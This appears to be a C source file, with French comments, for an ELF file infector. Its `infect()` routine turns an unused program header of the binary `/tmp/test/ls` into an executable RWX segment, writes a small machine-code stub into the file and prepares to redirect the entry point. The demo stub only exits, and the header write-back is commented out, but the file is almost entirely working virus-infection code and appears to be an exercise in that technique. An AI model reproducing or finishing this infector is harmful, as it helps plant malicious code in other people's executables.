#include <elf.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <limits.h>

uint64_t align_like(uint64_t base, uint64_t value, uint64_t align)
{
	return ((value - (base % 0x1000) + 0x1000 - 1) & ~0xFFF) + (base % 0x1000);
}

int	infect(char *str)
{
	char	stub[] = { 0x48, 0xC7, 0xC0, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x31, 0xFF, 0x0F, 0x05 };
	// C'est juste un mov rax, 60; xor rdi, rdi; syscall
	int		fd = open(str, 2, 0);
	if (fd < 0)
		return 0;
	printf("fd : %d\n", fd);
	int		offset = 0;
	int		gap = 0;
	Elf64_Ehdr	ehdr;
	Elf64_Phdr	phdr;
	Elf64_Phdr	new_phdr = {0};
	offset += read(fd, &ehdr, sizeof(Elf64_Ehdr));
	new_phdr.p_type = 1;
	new_phdr.p_offset = ehdr.e_shoff;
	new_phdr.p_vaddr = 0;
	new_phdr.p_align = 4096;
	new_phdr.p_filesz = sizeof(stub);
	new_phdr.p_memsz = sizeof(stub);
	new_phdr.p_flags = 7;
	int	i = 0;
	int	f = 0;
	while (i < ehdr.e_phnum)
	{
		offset += read(fd, &phdr, sizeof(Elf64_Phdr));
		if (phdr.p_type == 1)
		{
			if (new_phdr.p_vaddr < (phdr.p_vaddr + phdr.p_memsz))
				new_phdr.p_vaddr = phdr.p_vaddr + phdr.p_memsz;
			if (phdr.p_flags == 6)
				gap = phdr.p_vaddr - phdr.p_offset;
		}

		if (phdr.p_type == 0 || phdr.p_type == 4 || phdr.p_type == 5)
		{
			printf("Phdr inutile trouve!\n");
			break;
		}
		i++;
	}
	if (i == ehdr.e_phnum)
	{
		printf("Pas de phdr inutile trouve!\n");
		return 1;
	}
	new_phdr.p_vaddr += gap;

	uint64_t	hey = (new_phdr.p_vaddr - new_phdr.p_offset) % 4096;
	printf("gap : %ld\n", hey);
	new_phdr.p_vaddr = align_like(new_phdr.p_offset, new_phdr.p_vaddr, 4096);
	new_phdr.p_paddr = new_phdr.p_vaddr;
	offset -= sizeof(Elf64_Phdr);
	lseek(fd, offset, SEEK_SET);
	write(fd, &new_phdr, sizeof(Elf64_Phdr));
	lseek(fd, new_phdr.p_offset, SEEK_SET);
	write(fd, &stub, sizeof(stub));
	ehdr.e_entry = new_phdr.p_vaddr;
	lseek(fd, 0, SEEK_SET);
	//write(fd, &ehdr, sizeof(ehdr));
	printf("Fichier : %s, infecte!\n", str);
	close(fd);
	return 0;
}

int	main(void)
{
	infect("/tmp/test/ls");
	return 0;
}
